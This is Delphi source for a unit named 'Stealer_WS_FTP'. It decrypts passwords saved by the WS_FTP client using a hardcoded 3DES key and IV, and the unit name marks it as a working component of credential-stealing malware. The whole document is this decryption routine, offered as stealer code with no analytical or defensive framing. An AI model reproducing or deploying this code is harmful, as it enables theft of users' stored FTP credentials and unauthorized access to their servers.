unit Stealer_WS_FTP;

interface

uses
  Sysutils,Windows,EncdDecd,DCPdes;

function WS_FTP_Decrypt(const pwd:ansistring): String;

implementation

function WS_FTP_Decrypt(const pwd:ansistring): String;
var
  i:integer;
  Cipher: TDCP_3des;
  inputlen:dword;
  mpwd,decd:ansistring;
  pwdarr:array[0..1023] of byte;
const
  Key: array[0..23] of byte=
    ($E1,$F0,$C3,$D2,$A5,$B4,$87,$96,$69,$78,$4B,$5A,$2D,$3C,$0F,$1E,$34,$12,$78,$56,$ab,$90,$ef,$cd);

begin
  result:='';
  fillchar(pwdarr,sizeof(pwdarr),0);
  mpwd:=copy(pwd,2,length(pwd)-1);
  decd:=DecodeString(mpwd);
  inputlen:=length(decd);

  for i:=1 to inputlen do
    pwdarr[i-1]:=ord(decd[i]);

  Cipher := TDCP_3des.Create(nil);
  Cipher.Init(Key,Sizeof(Key)*8,nil);

  Cipher.SetIV(Key[16]);

  Cipher.Decrypt(pwdarr,pwdarr,inputlen);
  for i:=0 to sizeof(pwdarr)-1 do
  begin
    if pwdarr[i]<>0 then result:=result+chr(pwdarr[i]) else break;
  end;

  Cipher.Burn;
  Cipher.Free;
end;

end.
